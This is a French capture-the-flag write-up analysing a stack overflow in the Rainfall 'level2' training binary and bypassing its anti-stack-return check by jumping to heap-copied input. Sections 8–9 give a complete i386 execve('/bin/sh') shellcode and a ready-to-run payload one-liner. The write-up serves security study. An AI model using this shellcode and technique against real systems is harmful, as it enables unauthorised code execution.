
---

# RAPPORT — Analyse et exploitation du Level2 (Rainfall)

## 1. Contexte général

Le binaire `level2` contient une fonction `p` vulnérable utilisant `gets`, ce qui permet un **débordement de stack**.
Cependant, contrairement au level1, une **protection logicielle** est mise en place pour empêcher un retour direct vers la stack.

L’objectif reste identique :

> **Détourner le flux d’exécution afin d’obtenir l’exécution d’un shell.**

Mais le moyen diffère :
il n’est **plus possible** de retourner directement vers le buffer sur la stack.

---

## 2. Vue d’ensemble des fonctions

### Fonction `main`

```asm
push   %ebp
mov    %esp,%ebp
and    $0xfffffff0,%esp
call   p
leave
ret
```

`main` :

* crée une stack frame classique,
* aligne la stack,
* appelle la fonction vulnérable `p`,
* puis retourne.

Toute la vulnérabilité est contenue dans `p`.

---

## 3. Prologue de `p` et allocation mémoire

```asm
push   %ebp
mov    %esp,%ebp
sub    $0x68,%esp
```

### Effets :

* `0x68` = **104 octets** réservés pour les variables locales.
* `EBP` sert de repère fixe pour la stack frame.

---

## 4. Lecture utilisateur : appel à `gets`

```asm
lea    -0x4c(%ebp),%eax
mov    %eax,(%esp)
call   gets
```

### Analyse :

* Le buffer passé à `gets` est situé à :

  ```
  EBP - 0x4c
  ```
* `0x4c` = **76 octets**

Disposition mémoire :

```
(adresses hautes)
│
│ saved EIP             ← EBP + 4
│ saved EBP             ← EBP
├──────────────────────
│ buffer[76]
│ ...
│ buffer[0]             ← EBP - 0x4c
├──────────────────────
(adresses basses)
```

### Offsets importants :

* **76 octets** → écrasement du saved EBP
* **80 octets** → écrasement de la return address (saved EIP)

---

## 5. Garde-fou anti-retour vers la stack

Après `gets`, le programme effectue une vérification explicite :

```asm
mov    0x4(%ebp),%eax
mov    %eax,-0xc(%ebp)
mov    -0xc(%ebp),%eax
and    $0xb0000000,%eax
cmp    $0xb0000000,%eax
jne    normal_path
```

### Interprétation :

* Le programme lit la **return address** (saved EIP).
* Il masque les bits de poids fort.
* Si l’adresse commence par `0xb...` (zone typique de la stack en i386) :

  * affichage d’un message
  * appel à `_exit(1)`
* Sinon :

  * poursuite de l’exécution normale.

### Point crucial

Ce garde-fou :

* **ne détecte pas un overflow**
* **n’empêche pas l’écrasement du EIP**
* **interdit uniquement un retour vers la stack**

---

## 6. Chemin d’exécution normal : `puts` et `strdup`

Si la vérification est passée :

```asm
puts(buffer)
strdup(buffer)
leave
ret
```

### Rôle de `strdup`

* `strdup` :

  * alloue de la mémoire sur le **heap**
  * copie le contenu du buffer dedans
  * retourne un pointeur vers cette copie
* Ce pointeur est placé dans **`EAX`** (convention d’appel x86).

Conséquence :

> Le contenu injecté par l’utilisateur existe désormais **en mémoire heap**, à une adresse **non bloquée par le garde-fou**.

---

## 7. Stratégie d’exploitation

### Contraintes

* Retour vers la stack interdit (`0xb...`)
* NX désactivé → code exécutable
* Binaire non PIE → adresses du code fixes

### Stratégie retenue

1. Injecter un **shellcode** au début de l’entrée utilisateur.
2. Laisser `strdup` copier ce shellcode sur le **heap**.
3. Écraser la return address avec :

   * l’adresse d’un **gadget dans le binaire** (`0x0804....`)
   * gadget effectuant un saut indirect vers `EAX` (`jmp eax` / `call eax`)
4. Le gadget transfère l’exécution vers le heap → shellcode exécuté.

---

## 8. Le shellcode utilisé

Shellcode i386 minimal appelant `execve("/bin/sh")` :

```asm
6a 0b          push 0xb
58             pop eax
99             cdq
52             push edx
68 2f2f7368    push "//sh"
68 2f62696e    push "/bin"
89 e3          mov ebx, esp
31 c9          xor ecx, ecx
cd 80          int 0x80
```

### Justification technique

* syscall direct → aucune dépendance libc
* pas d’octets nuls (`\x00`)
* pas d’adresses absolues
* compatible Linux i386 (`int 0x80`)
* position-indépendant

---

## 9. Construction du payload

Structure logique :

```
[shellcode]
[padding jusqu’à 80 octets]
[adresse du gadget]
```

Exemple :

```bash
(python -c 'print shellcode + "A"*padding + ret_addr'; cat) | ./level2
```

Ce qui donne:

```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"'; cat) | ./level2

```

### Pourquoi `cat` ?

* Maintient l’entrée standard ouverte
* Permet d’interagir avec le shell lancé
* Évite un EOF prématuré

---

## 10. Détournement du flux d’exécution

Lors du retour de `p` :

1. `leave` restaure la stack frame
2. `ret` charge la return address écrasée
3. Exécution du gadget (`jmp eax`)
4. Saut vers le heap
5. Exécution du shellcode
6. Appel système `execve("/bin/sh")`

---

## 11. Layout mémoire et justification des adresses

* `0x0804xxxx` → code du binaire (`.text`, `.plt`)
* heap → mémoire allouée dynamiquement par le kernel
* stack → zone `0xbffffxxx`

Le garde-fou bloque uniquement les adresses stack, pas :

* le code du binaire
* le heap
* les sauts indirects

---

## 12. Synthèse finale

> Le level2 introduit une protection empêchant le retour direct vers la stack.
> Cette protection est contournée en exploitant le fait que `strdup` copie l’entrée utilisateur sur le heap et en redirigeant le flux d’exécution vers un gadget du binaire qui transfère l’exécution vers cette zone.
> Un shellcode minimal i386 est alors exécuté, permettant l’obtention d’un shell.

---
